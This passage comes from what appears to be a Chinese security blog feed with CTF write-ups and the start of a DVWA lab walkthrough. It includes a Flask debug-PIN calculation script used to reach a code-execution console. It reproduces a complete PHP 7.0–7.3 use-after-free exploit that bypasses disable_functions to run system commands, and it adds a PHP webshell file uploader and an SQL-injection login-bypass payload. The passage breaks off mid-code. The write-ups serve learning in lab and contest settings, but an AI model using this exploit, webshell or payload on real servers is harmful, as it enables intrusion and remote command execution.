class="keyword">in</span> chain(probably_public_bits, private_bits):</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> bit:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">if</span> isinstance(bit, str):</span><br><span class="line">        bit = bit.encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    h.update(bit)</span><br><span class="line">h.update(<span class="string">b&#x27;cookiesalt&#x27;</span>)</span><br><span class="line"></span><br><span class="line">cookie_name = <span class="string">&#x27;__wzd&#x27;</span> + h.hexdigest()[:<span class="number">20</span>]</span><br><span class="line"></span><br><span class="line">num = <span class="literal">None</span></span><br><span class="line"><span class="keyword">if</span> num <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">    h.update(<span class="string">b&#x27;pinsalt&#x27;</span>)</span><br><span class="line">    num = (<span class="string">&#x27;%09d&#x27;</span> % int(h.hexdigest(), <span class="number">16</span>))[:<span class="number">9</span>]</span><br><span class="line"></span><br><span class="line">rv =<span class="literal">None</span></span><br><span class="line"><span class="keyword">if</span> rv <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">    <span class="keyword">for</span> group_size <span class="keyword">in</span> <span class="number">5</span>, <span class="number">4</span>, <span class="number">3</span>:</span><br><span class="line">        <span class="keyword">if</span> len(num) % group_size == <span class="number">0</span>:</span><br><span class="line">            rv = <span class="string">&#x27;-&#x27;</span>.join(num[x:x + group_size].rjust(group_size, <span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">                          <span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">0</span>, len(num), group_size))</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        rv = num</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">print(rv)</span><br></pre></td></tr></table></figure><p>得到PIN码，刚才报错的位置，输入PIN码，正确即可进入一个python的shell</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ python flask-PIN.py</span><br><span class="line">103-824-476</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/02/25/9u6iAn7eqayw21W.png"></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&gt;&gt;&gt; print(os.popen(&#39;ls &#x2F;&#39;).read())</span><br><span class="line">...</span><br><span class="line">this_is_the_flag.txt</span><br><span class="line">...</span><br><span class="line">&gt;&gt;&gt; flag &#x3D; os.popen(&#39;cat &#x2F;this_is_the_flag.txt&#39;).read()</span><br><span class="line">&gt;&gt;&gt; print(flag)</span><br><span class="line">flag&#123;93df69f0-3005-414f-a119-c5562af1b167&#125;</span><br></pre></td></tr></table></figure><h3 id="easy-thinking"><a href="#easy-thinking" class="headerlink" title="easy_thinking"></a>easy_thinking</h3><p>非预期</p><p>因为<code>/runtime/session/</code>存在目录遍历，加之题目没有做docker容器，导致可以看其他选手的payload，在这个目录下发现了其他选手存的东西：</p><p><img src="https://i.loli.net/2020/02/25/kHFnqSGICh4LgDY.png"></p><p><strong>预期解</strong></p><p>考察<a href="https://paper.seebug.org/1114/">TP6任意文件操作漏洞</a></p><blockquote><p>由不安全的SessionId导致的任意文件操作漏洞。该漏洞允许攻击者在目标环境启用session的条件下创建任意文件以及删除任意文件，在特定情况下还可以getshell。</p></blockquote><p>进入网站，登录后，有一个搜索功能，会将个人搜索记录以序列化的方式存到以session命名的文件中。</p><p>因为存在上述漏洞，可以任意写入文件，这里直接写一句话，发现不行。用<code>phpinfo()</code>查看禁用函数。</p><p><img src="https://i.loli.net/2020/02/25/B15Kbfl6wMQR3rn.png"></p><p>用<code>scandir(&#39;/&#39;)</code>发现根目录，有一个<code>flag</code>和一个<code>readflag</code></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Array ( [0] &#x3D;&gt; . [1] &#x3D;&gt; .. [2] &#x3D;&gt; .dockerenv [3] &#x3D;&gt; bin [4] &#x3D;&gt; boot [5] &#x3D;&gt; dev [6] &#x3D;&gt; etc [7] &#x3D;&gt; flag [8] &#x3D;&gt; home [9] &#x3D;&gt; lib [10] &#x3D;&gt; lib64 [11] &#x3D;&gt; media [12] &#x3D;&gt; mnt [13] &#x3D;&gt; opt [14] &#x3D;&gt; proc [15] &#x3D;&gt; readflag [16] &#x3D;&gt; root [17] &#x3D;&gt; run [18] &#x3D;&gt; sbin [19] &#x3D;&gt; srv [20] &#x3D;&gt; start.sh [21] &#x3D;&gt; sys [22] &#x3D;&gt; tmp [23] &#x3D;&gt; usr [24] &#x3D;&gt; var ) &quot;;&#125;</span><br></pre></td></tr></table></figure><p>尝试用php的文件读取函数直接读<code>flag</code>，发现没有权限<code>Permission denied </code>。</p><p>推测需要通过绕过禁用函数，RCE执行<code>readflag</code>读取<code>flag</code>。</p><p>找了一个大佬的脚本：<a href="https://github.com/mm0r1/exploits/tree/master/php7-gc-bypass">https://github.com/mm0r1/exploits/tree/master/php7-gc-bypass</a></p><p>利用这个<strong>GC的特定析构函数free后使用导致的漏洞</strong><a href="https://bugs.php.net/bug.php?id=72530"><strong>Use After Free in GC with Certain Destructors</strong></a></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># PHP 7.0-7.3 disable_functions bypass PoC (*nix only)</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># <span class="doctag">Bug:</span> https://bugs.php.net/bug.php?id=72530</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># This exploit should work on all PHP 7.0-7.3 versions</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># Author: https://github.com/mm0r1</span></span><br><span class="line"></span><br><span class="line">pwn(<span class="string">&quot;/readflag&quot;</span>); <span class="comment">//这里是想要执行的系统命令</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">pwn</span>(<span class="params">$cmd</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">global</span> $abc, $helper;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">str2ptr</span>(<span class="params">&amp;$str, $p = <span class="number">0</span>, $s = <span class="number">8</span></span>) </span>&#123;</span><br><span class="line">        $address = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>($j = $s<span class="number">-1</span>; $j &gt;= <span class="number">0</span>; $j--) &#123;</span><br><span class="line">            $address &lt;&lt;= <span class="number">8</span>;</span><br><span class="line">            $address |= ord($str[$p+$j]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> $address;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">ptr2str</span>(<span class="params">$ptr, $m = <span class="number">8</span></span>) </span>&#123;</span><br><span class="line">        $out = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">for</span> ($i=<span class="number">0</span>; $i &lt; $m; $i++) &#123;</span><br><span class="line">            $out .= chr($ptr &amp; <span class="number">0xff</span>);</span><br><span class="line">            $ptr &gt;&gt;= <span class="number">8</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> $out;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">write</span>(<span class="params">&amp;$str, $p, $v, $n = <span class="number">8</span></span>) </span>&#123;</span><br><span class="line">        $i = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>($i = <span class="number">0</span>; $i &lt; $n; $i++) &#123;</span><br><span class="line">            $str[$p + $i] = chr($v &amp; <span class="number">0xff</span>);</span><br><span class="line">            $v &gt;&gt;= <span class="number">8</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">leak</span>(<span class="params">$addr, $p = <span class="number">0</span>, $s = <span class="number">8</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> $abc, $helper;</span><br><span class="line">        write($abc, <span class="number">0x68</span>, $addr + $p - <span class="number">0x10</span>);</span><br><span class="line">        $leak = strlen($helper-&gt;a);</span><br><span class="line">        <span class="keyword">if</span>($s != <span class="number">8</span>) &#123; $leak %= <span class="number">2</span> &lt;&lt; ($s * <span class="number">8</span>) - <span class="number">1</span>; &#125;</span><br><span class="line">        <span class="keyword">return</span> $leak;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">parse_elf</span>(<span class="params">$base</span>) </span>&#123;</span><br><span class="line">        $e_type = leak($base, <span class="number">0x10</span>, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">        $e_phoff = leak($base, <span class="number">0x20</span>);</span><br><span class="line">        $e_phentsize = leak($base, <span class="number">0x36</span>, <span class="number">2</span>);</span><br><span class="line">        $e_phnum = leak($base, <span class="number">0x38</span>, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>($i = <span class="number">0</span>; $i &lt; $e_phnum; $i++) &#123;</span><br><span class="line">            $header = $base + $e_phoff + $i * $e_phentsize;</span><br><span class="line">            $p_type  = leak($header, <span class="number">0</span>, <span class="number">4</span>);</span><br><span class="line">            $p_flags = leak($header, <span class="number">4</span>, <span class="number">4</span>);</span><br><span class="line">            $p_vaddr = leak($header, <span class="number">0x10</span>);</span><br><span class="line">            $p_memsz = leak($header, <span class="number">0x28</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>($p_type == <span class="number">1</span> &amp;&amp; $p_flags == <span class="number">6</span>) &#123; <span class="comment"># PT_LOAD, PF_Read_Write</span></span><br><span class="line">                <span class="comment"># handle pie</span></span><br><span class="line">                $data_addr = $e_type == <span class="number">2</span> ? $p_vaddr : $base + $p_vaddr;</span><br><span class="line">                $data_size = $p_memsz;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span>($p_type == <span class="number">1</span> &amp;&amp; $p_flags == <span class="number">5</span>) &#123; <span class="comment"># PT_LOAD, PF_Read_exec</span></span><br><span class="line">                $text_size = $p_memsz;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!$data_addr || !$text_size || !$data_size)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> [$data_addr, $text_size, $data_size];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get_basic_funcs</span>(<span class="params">$base, $elf</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">list</span>($data_addr, $text_size, $data_size) = $elf;</span><br><span class="line">        <span class="keyword">for</span>($i = <span class="number">0</span>; $i &lt; $data_size / <span class="number">8</span>; $i++) &#123;</span><br><span class="line">            $leak = leak($data_addr, $i * <span class="number">8</span>);</span><br><span class="line">            <span class="keyword">if</span>($leak - $base &gt; <span class="number">0</span> &amp;&amp; $leak - $base &lt; $data_addr - $base) &#123;</span><br><span class="line">                $deref = leak($leak);</span><br><span class="line">                <span class="comment"># &#x27;constant&#x27; constant check</span></span><br><span class="line">                <span class="keyword">if</span>($deref != <span class="number">0x746e6174736e6f63</span>)</span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">            $leak = leak($data_addr, ($i + <span class="number">4</span>) * <span class="number">8</span>);</span><br><span class="line">            <span class="keyword">if</span>($leak - $base &gt; <span class="number">0</span> &amp;&amp; $leak - $base &lt; $data_addr - $base) &#123;</span><br><span class="line">                $deref = leak($leak);</span><br><span class="line">                <span class="comment"># &#x27;bin2hex&#x27; constant check</span></span><br><span class="line">                <span class="keyword">if</span>($deref != <span class="number">0x786568326e6962</span>)</span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> $data_addr + $i * <span class="number">8</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get_binary_base</span>(<span class="params">$binary_leak</span>) </span>&#123;</span><br><span class="line">        $base = <span class="number">0</span>;</span><br><span class="line">        $start = $binary_leak &amp; <span class="number">0xfffffffffffff000</span>;</span><br><span class="line">        <span class="keyword">for</span>($i = <span class="number">0</span>; $i &lt; <span class="number">0x1000</span>; $i++) &#123;</span><br><span class="line">            $addr = $start - <span class="number">0x1000</span> * $i;</span><br><span class="line">            $leak = leak($addr, <span class="number">0</span>, <span class="number">7</span>);</span><br><span class="line">            <span class="keyword">if</span>($leak == <span class="number">0x10102464c457f</span>) &#123; <span class="comment"># ELF header</span></span><br><span class="line">                <span class="keyword">return</span> $addr;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get_system</span>(<span class="params">$basic_funcs</span>) </span>&#123;</span><br><span class="line">        $addr = $basic_funcs;</span><br><span class="line">        <span class="keyword">do</span> &#123;</span><br><span class="line">            $f_entry = leak($addr);</span><br><span class="line">            $f_name = leak($f_entry, <span class="number">0</span>, <span class="number">6</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>($f_name == <span class="number">0x6d6574737973</span>) &#123; <span class="comment"># system</span></span><br><span class="line">                <span class="keyword">return</span> leak($addr + <span class="number">8</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            $addr += <span class="number">0x20</span>;</span><br><span class="line">        &#125; <span class="keyword">while</span>($f_entry != <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">ryat</span> </span>&#123;</span><br><span class="line">        <span class="keyword">var</span> $ryat;</span><br><span class="line">        <span class="keyword">var</span> $chtg;</span><br><span class="line">        </span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;chtg = <span class="keyword">$this</span>-&gt;ryat;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;ryat = <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Helper</span> </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> $a, $b, $c, $d;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(stristr(PHP_OS, <span class="string">&#x27;WIN&#x27;</span>)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;This PoC is for *nix systems only.&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $n_alloc = <span class="number">10</span>; <span class="comment"># increase this value if you get segfaults</span></span><br><span class="line"></span><br><span class="line">    $contiguous = [];</span><br><span class="line">    <span class="keyword">for</span>($i = <span class="number">0</span>; $i &lt; $n_alloc; $i++)</span><br><span class="line">        $contiguous[] = str_repeat(<span class="string">&#x27;A&#x27;</span>, <span class="number">79</span>);</span><br><span class="line"></span><br><span class="line">    $poc = <span class="string">&#x27;a:4:&#123;i:0;i:1;i:1;a:1:&#123;i:0;O:4:&quot;ryat&quot;:2:&#123;s:4:&quot;ryat&quot;;R:3;s:4:&quot;chtg&quot;;i:2;&#125;&#125;i:1;i:3;i:2;R:5;&#125;&#x27;</span>;</span><br><span class="line">    $out = unserialize($poc);</span><br><span class="line">    gc_collect_cycles();</span><br><span class="line"></span><br><span class="line">    $v = [];</span><br><span class="line">    $v[<span class="number">0</span>] = ptr2str(<span class="number">0</span>, <span class="number">79</span>);</span><br><span class="line">    <span class="keyword">unset</span>($v);</span><br><span class="line">    $abc = $out[<span class="number">2</span>][<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line">    $helper = <span class="keyword">new</span> Helper;</span><br><span class="line">    $helper-&gt;b = <span class="function"><span class="keyword">function</span> (<span class="params">$x</span>) </span>&#123; &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(strlen($abc) == <span class="number">79</span> || strlen($abc) == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;UAF failed&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># leaks</span></span><br><span class="line">    $closure_handlers = str2ptr($abc, <span class="number">0</span>);</span><br><span class="line">    $php_heap = str2ptr($abc, <span class="number">0x58</span>);</span><br><span class="line">    $abc_addr = $php_heap - <span class="number">0xc8</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># fake value</span></span><br><span class="line">    write($abc, <span class="number">0x60</span>, <span class="number">2</span>);</span><br><span class="line">    write($abc, <span class="number">0x70</span>, <span class="number">6</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment"># fake reference</span></span><br><span class="line">    write($abc, <span class="number">0x10</span>, $abc_addr + <span class="number">0x60</span>);</span><br><span class="line">    write($abc, <span class="number">0x18</span>, <span class="number">0xa</span>);</span><br><span class="line"></span><br><span class="line">    $closure_obj = str2ptr($abc, <span class="number">0x20</span>);</span><br><span class="line"></span><br><span class="line">    $binary_leak = leak($closure_handlers, <span class="number">8</span>);</span><br><span class="line">    <span class="keyword">if</span>(!($base = get_binary_base($binary_leak))) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Couldn&#x27;t determine binary base address&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!($elf = parse_elf($base))) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Couldn&#x27;t parse ELF header&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!($basic_funcs = get_basic_funcs($base, $elf))) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Couldn&#x27;t get basic_functions address&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!($zif_system = get_system($basic_funcs))) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Couldn&#x27;t get zif_system address&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># fake closure object</span></span><br><span class="line">    $fake_obj_offset = <span class="number">0xd0</span>;</span><br><span class="line">    <span class="keyword">for</span>($i = <span class="number">0</span>; $i &lt; <span class="number">0x110</span>; $i += <span class="number">8</span>) &#123;</span><br><span class="line">        write($abc, $fake_obj_offset + $i, leak($closure_obj, $i));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># pwn</span></span><br><span class="line">    write($abc, <span class="number">0x20</span>, $abc_addr + $fake_obj_offset);</span><br><span class="line">    write($abc, <span class="number">0xd0</span> + <span class="number">0x38</span>, <span class="number">1</span>, <span class="number">4</span>); <span class="comment"># internal func type</span></span><br><span class="line">    write($abc, <span class="number">0xd0</span> + <span class="number">0x68</span>, $zif_system); <span class="comment"># internal func handler</span></span><br><span class="line"></span><br><span class="line">    ($helper-&gt;b)($cmd);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>但是因为题目的搜索有长度限制，并不能直接把这么长的脚本保存到session的php文件里，需要先传一个php小马，再用小马上传这个<code>bypass</code>脚本。这是我找的一个小马：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php if(@$_GET[&quot;act&quot;]&#x3D;&#x3D;&quot;save&quot;)&#123;if(isset($_POST[&quot;content&quot;])&amp;&amp;isset($_POST[&quot;name&quot;]))&#123;if($_POST[&quot;content&quot;]!&#x3D;&quot;&quot;&amp;&amp;$_POST[&quot;name&quot;]!&#x3D;&quot;&quot;)&#123;if(fwrite(fopen(stripslashes($_POST[&quot;name&quot;]),&quot;w&quot;),stripslashes($_POST[&quot;content&quot;])))&#123;echo &quot;OK! &lt;a href&#x3D;\&quot;&quot;.stripslashes($_POST[&quot;name&quot;]).&quot;\&quot;&gt;&quot;.stripslashes($_POST[&quot;name&quot;]).&quot;&lt;&#x2F;a&gt;&quot;;&#125;;&#125;&#125;&#125;else&#123;if(@$_GET[&quot;act&quot;]&#x3D;&#x3D;&quot;godsdoor&quot;)&#123;echo &#39;&lt;meta charset&#x3D;&quot;utf-8&quot;&gt;&lt;form action&#x3D;&quot;?act&#x3D;save&quot; method&#x3D;&quot;post&quot;&gt;content:&lt;br&#x2F;&gt;&lt;textarea name&#x3D;&quot;content&quot; &gt;&lt;&#x2F;textarea&gt;&lt;br&#x2F;&gt;filenane:&lt;br&#x2F;&gt;&lt;input name&#x3D;&quot;name&quot;&#x2F;&gt;&lt;br&#x2F;&gt;&lt;input type&#x3D;&quot;submit&quot; value&#x3D;&quot;GO!&quot;&gt;&lt;&#x2F;form&gt;&#39;;&#125;&#125;</span><br><span class="line">?&gt;</span><br><span class="line">&#x2F;&#x2F; ?act&#x3D;godsdoor</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/02/25/v6P75cmJGpabOjl.png"></p><p>将上面的<code>bypass.php</code>上传到这个目录，访问上传的文件就可以RCE了。</p><p><img src="https://i.loli.net/2020/02/25/PqzkIJErRKdm3UT.png"></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 反序列化 </tag>
            
            <tag> SQL注入 </tag>
            
            <tag> 文件上传 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DVWA全级别漏洞复现</title>
      <link href="/2020/01/05/DVWA-all_in_one/"/>
      <url>/2020/01/05/DVWA-all_in_one/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>考研大半年没碰安全方面，考完研，想重新拾起网络安全方面的知识，想起来重新复现一遍DVWA，新的一年，希望能温故知新。另一方面，新版的<code>dvwa1.9</code>新增了几个新模块，博主之前未分析过，也学习一下分享一下。</p><h1 id="BruteForce（暴力破解）"><a href="#BruteForce（暴力破解）" class="headerlink" title="BruteForce（暴力破解）"></a>BruteForce（暴力破解）</h1><p>很熟悉了，直接看代码吧。</p><h2 id="Low"><a href="#Low" class="headerlink" title="Low"></a>Low</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_GET[ <span class="string">&#x27;Login&#x27;</span> ] ) ) &#123;</span><br><span class="line"><span class="comment">// Get username</span></span><br><span class="line">$user = $_GET[ <span class="string">&#x27;username&#x27;</span> ];</span><br><span class="line"></span><br><span class="line"><span class="comment">// Get password</span></span><br><span class="line">$pass = $_GET[ <span class="string">&#x27;password&#x27;</span> ];</span><br><span class="line">$pass = md5( $pass );</span><br><span class="line"></span><br><span class="line"><span class="comment">// Check the database</span></span><br><span class="line">$query  = <span class="string">&quot;SELECT * FROM `users` WHERE user = &#x27;$user&#x27; AND password = &#x27;$pass&#x27;;&quot;</span>;</span><br><span class="line">$result = mysqli_query($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>],  $query ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">&#x27;&lt;pre&gt;&#x27;</span> . ((is_object($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_error($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : <span class="literal">false</span>)) . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span> );</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( $result &amp;&amp; mysqli_num_rows( $result ) == <span class="number">1</span> ) &#123;</span><br><span class="line"><span class="comment">// Get users details</span></span><br><span class="line">$row    = mysqli_fetch_assoc( $result );</span><br><span class="line">$avatar = $row[<span class="string">&quot;avatar&quot;</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">// Login successful</span></span><br><span class="line">$html .= <span class="string">&quot;&lt;p&gt;Welcome to the password protected area &#123;$user&#125;&lt;/p&gt;&quot;</span>;</span><br><span class="line">$html .= <span class="string">&quot;&lt;img src=\&quot;&#123;$avatar&#125;\&quot; /&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line"><span class="comment">// Login failed</span></span><br><span class="line">$html .= <span class="string">&quot;&lt;pre&gt;&lt;br /&gt;Username and/or password incorrect.&lt;/pre&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">((is_null($___mysqli_res = mysqli_close($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>]))) ? <span class="literal">false</span> : $___mysqli_res);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>可以看到第3行，只验证了参数Login知否设置，没有防爆破方法，参数username和password都是没有任何过滤，直接拼接的，还存在明显的SQL注入漏洞。</p><p><strong>漏洞利用</strong></p><p><strong>方法 1 暴力破解</strong></p><p><img src="https://i.loli.net/2020/02/27/9O5TMPLaI7dnjou.png"></p><p><strong>方法2 SQl注入</strong></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">username&#x3D;admin &#39;# &amp;password&#x3D;1</span><br></pre></td></tr></table></figure><h2 id="Medium"><a href="#Medium" class="headerlink" title="Medium"></a>Medium</h2><p>与<code>Low</code>的区别就在于这，增加了<code>$user</code>和<code>pass</code>的过滤，<code>mysql_real_escape_string</code>对特殊符号转义，加上对象判断，基本上能防御sql注入。但是并没有增防止加爆破的机制。依然可以通过爆破来爆破出密码，同上不做赘述。</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_GET[ <span class="string">&#x27;Login&#x27;</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Sanitise username input</span></span><br><span class="line">    $user = $_GET[ <span class="string">&#x27;username&#x27;</span> ];</span><br><span class="line">    $user = ((<span class="keyword">isset</span>($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; is_object($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_real_escape_string($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>],  $user ) : ((trigger_error(<span class="string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="string">&quot;&quot;</span> : <span class="string">&quot;&quot;</span>));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Sanitise password input</span></span><br><span class="line">    $pass = $_GET[ <span class="string">&#x27;password&#x27;</span> ];</span><br><span class="line">    $pass = ((<span class="keyword">isset</span>($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; is_object($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_real_escape_string($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>],  $pass ) : ((trigger_error(<span class="string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="string">&quot;&quot;</span> : <span class="string">&quot;&quot;</span>));</span><br><span class="line">    $pass = md5( $pass );</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="high"><a href="#high" class="headerlink" title="high"></a>high</h2><p>增加了<code>user_token</code>用于防御CSRF，登陆时需要验证4个参数：<code>username</code>,<code>password</code>,<code>Login</code>,<code>user_token</code>.</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Check Anti-CSRF token</span></span><br><span class="line">   checkToken( $_REQUEST[ <span class="string">&#x27;user_token&#x27;</span> ], $_SESSION[ <span class="string">&#x27;session_token&#x27;</span> ], <span class="string">&#x27;index.php&#x27;</span> );</span><br><span class="line"></span><br><span class="line">   <span class="comment">// Sanitise username input</span></span><br><span class="line">   $user = $_GET[ <span class="string">&#x27;username&#x27;</span> ];</span><br><span class="line">   $user = stripslashes( $user );</span><br><span class="line">   $user = ((<span class="keyword">isset</span>($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; is_object($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_real_escape_string($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>],  $user ) : ((trigger_error(<span class="string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="string">&quot;&quot;</span> : <span class="string">&quot;&quot;</span>));</span><br><span class="line"></span><br><span class="line">   <span class="comment">// Sanitise password input</span></span><br><span class="line">   $pass = $_GET[ <span class="string">&#x27;password&#x27;</span> ];</span><br><span class="line">   $pass = stripslashes( $pass );</span><br><span class="line">   $pass = ((<span class="keyword">isset</span>($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; is_object($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? 